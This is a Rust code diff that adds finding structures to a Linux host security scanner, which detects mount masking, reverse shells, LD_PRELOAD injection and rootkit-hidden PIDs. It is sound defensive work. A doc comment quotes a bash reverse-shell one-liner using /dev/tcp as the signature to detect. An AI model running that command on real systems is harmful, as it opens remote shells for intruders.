@@ -285,6 +285,14 @@ pub struct SecurityInfo {
     pub capability_audit: Vec<ProcCapFinding>,
     #[serde(default)]
     pub suspicious_processes: Vec<SuspiciousProcess>,
+    #[serde(default)]
+    pub mount_masking: Vec<MountMaskingFinding>,
+    #[serde(default)]
+    pub reverse_shells: Vec<ReverseShellFinding>,
+    #[serde(default)]
+    pub library_injections: Vec<LibraryInjectionFinding>,
+    #[serde(default)]
+    pub ghost_pids: Vec<GhostPidFinding>,
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
@@ -477,4 +485,97 @@ pub struct ProcCapFinding {
     #[serde(default)]
     pub seccomp: Option<u8>,
     pub critical_caps: Vec<String>,
+}
+
+// Bind‑mount / overlay masking (SEC‑021)
+
+/// A mount point that appears to hide something a defender would want to see:
+/// a `/proc/<pid>` overlay (process hiding) or a tmpfs/bind overlay on top of
+/// a log or container-log path (evidence hiding). Parsed from
+/// `/proc/self/mountinfo`.
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct MountMaskingFinding {
+    /// Mount point being masked (mountinfo field 5), e.g. `/proc/1234`.
+    pub target_path: String,
+    /// Mount source (mountinfo post-separator field 2), e.g. `tmpfs`, `/dev/sda1`.
+    pub mount_source: String,
+    /// Filesystem type (mountinfo post-separator field 1), e.g. `tmpfs`, `ext4`.
+    pub fstype: String,
+    /// Why this was flagged, for the evidence string (e.g. `hidden PID`,
+    /// `tmpfs over /var/log`, `bind overlay on /var/log`).
+    #[serde(default)]
+    pub reason: String,
+}
+
+// Reverse-shell / C2 correlation (SEC-022)
+
+/// An interactive interpreter (bash, python, nc, socat, …) holding an
+/// ESTABLISHED outbound TCP socket to a public remote address, with that
+/// socket wired to one of its stdio fds (0/1/2). This is the signature of a
+/// classic reverse shell (`bash -i >& /dev/tcp/host/port 0>&1`), correlated
+/// from `/proc/net/tcp{,6}` (established) × `/proc/<pid>/fd`.
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct ReverseShellFinding {
+    pub pid: u32,
+    /// Process comm (the interpreter name that matched the shell allowlist).
+    pub process: String,
+    /// Resolved executable path, if readable.
+    #[serde(default)]
+    pub exe_path: Option<String>,
+    /// Remote endpoint the socket is connected to, `ip:port`.
+    pub remote_address: String,
+    /// Which stdio fd carried the socket: 0=stdin, 1=stdout, 2=stderr.
+    /// None = socket held on a non-stdio fd (weaker, still reported).
+    #[serde(default)]
+    pub stdio_fd: Option<u8>,
+}
+
+// Userspace rootkit / library injection (SEC-023)
+
+/// Evidence that a process has a shared object injected from a writable or
+/// ephemeral location — the signature of a userspace rootkit / LD_PRELOAD
+/// implant (libprocesshider, Azazel, Jynx). Sourced from `/proc/<pid>/environ`
+/// (LD_PRELOAD / LD_LIBRARY_PATH pointing at an ephemeral path) and
+/// `/proc/<pid>/maps` (a file-backed .so actually mapped from such a path).
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct LibraryInjectionFinding {
+    pub pid: u32,
+    /// Process comm, for the evidence string.
+    pub process: String,
+    /// The offending path (the .so or the LD_* value).
+    pub object_path: String,
+    /// Where it was observed: "LD_PRELOAD", "LD_LIBRARY_PATH", or "maps".
+    pub source: String,
+    /// True when the mapped object is marked "(deleted)" — a stronger IoC
+    /// (implant unlinked to hide from disk inspection).
+    #[serde(default)]
+    pub is_deleted: bool,
+}
+
+// True Ghost PID — LKM rootkit process hiding (SEC-024)
+
+/// A PID that is live via direct `/proc/<pid>` stat AND/OR `kill(pid,0)` but is
+/// absent from the `readdir("/proc")` listing across multiple probe cycles —
+/// the signature of a getdents64-hooking LKM rootkit (Diamorphine class).
+/// `confirmed_ioc` distinguishes a hard IoC (survived all cycles, age ≥ 2s,
+/// live state) from a downgraded suspicion (young/racy/unconfirmable).
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct GhostPidFinding {
+    pub pid: u32,
+    /// Process state from /proc/<pid>/stat (R/S/D/Z/…), if readable.
+    #[serde(default)]
+    pub state: Option<String>,
+    /// Age in seconds derived from starttime, if computable.
+    #[serde(default)]
+    pub age_secs: Option<u64>,
+    /// How existence was confirmed: "stat-path", "kill", or "stat-path+kill".
+    /// A "kill"-only confirmation with stat-path ENOENT indicates a rootkit
+    /// hiding the direct /proc path too (advanced variant).
+    pub confirmed_via: String,
+    /// True = hard IoC (exit-3 eligible); false = downgraded suspicion.
+    #[serde(default)]
+    pub confirmed_ioc: bool,
+    /// Corroboration: this hidden PID also owns a network socket.
+    #[serde(default)]
+    pub holds_socket: bool,
 }
